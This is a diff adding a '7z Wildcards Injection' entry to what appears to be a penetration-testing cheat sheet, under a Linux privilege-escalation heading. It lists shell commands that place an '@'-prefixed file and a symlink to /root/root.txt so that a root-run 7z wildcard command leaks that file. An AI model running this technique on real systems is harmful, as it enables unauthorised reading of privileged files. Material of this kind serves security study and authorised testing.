@@ -257,6 +257,27 @@ sqlmap -r request.txt -p <target_param> -D <DB_name> -T <TABLE_name> -C <column_
 
 # Linux Privilege Escalation
 
+## 7z
+
+### Wildcards Injection
+```bash
+# This works a privileged user (e.g., root) executes a 7z command with wildcards like:
+7za a /backup/$filename.zip -t7z -snl -p$pass -- *
+
+# 1. Navigate to the directory where the 7z command is executed
+cd /path/to/7z/acting/folder
+
+# 2. Create a file starting with '@' to exploit 7z's list file feature
+touch @root.txt
+
+# 3. Create a symlink to the file
+ln -s /root/root.txt root.txt
+
+# 4. Wait for the 7z command to be executed by the privileged user
+# The content of @root.txt isn't a valid 7z list file, so 7z throws an error and shows the content of root.txt
+```
+> - [Wildcards Spare tricks - HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks#id-7z)
+
 ## Sudo
 
 ### Sudo Version
